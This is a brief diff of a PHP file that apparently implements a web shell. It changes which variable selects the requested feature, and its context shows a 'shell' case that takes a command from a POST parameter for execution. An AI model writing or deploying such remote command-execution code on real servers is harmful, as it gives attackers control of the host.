@@ -447,7 +447,7 @@ if (!empty($_POST['feature'])) {
 
 if (!empty($input_feature)) {
     $response = NULL;
-    switch ($_GET["feature"]) {
+    switch ($input_feature) {
         case "shell":
             $cmd = $_POST['cmd'];
             if (!preg_match('/2>/', $cmd)) {
